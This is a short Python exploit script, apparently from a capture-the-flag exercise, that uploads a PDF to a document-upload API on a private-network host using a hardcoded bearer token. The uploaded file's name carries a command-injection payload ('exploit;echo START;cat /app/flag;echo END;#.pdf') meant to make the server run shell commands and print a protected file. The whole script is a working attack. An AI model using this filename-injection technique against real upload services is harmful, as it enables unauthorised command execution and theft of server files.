#!/usr/bin/env python3
import requests, os

TARGET = "http://10.11.12.9:5000"
TOKEN = os.environ.get("TOKEN", "eyJzZXNzaW9uX2lkIjoiUTVwTl9hMlZ5dm43V0lKNktUSDJSR3V2Vk9WYjBiMFliTWlnY0p3VVpUQSJ9.aOPJGw.9DPyqL_jEUWciNN1LDRvDZnG7hg")
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

# Den exakta payload du vill se i serverns file.filename
payload_filename = "exploit;echo START;cat /app/flag;echo END;#.pdf"

with open("file-sample_150kB.pdf","rb") as f:
    files = {"file": (payload_filename, f, "application/pdf")}
    r = requests.post(f"{TARGET}/api/upload-document", headers=HEADERS, files=files)
    print("HTTP", r.status_code)
    print(r.text)
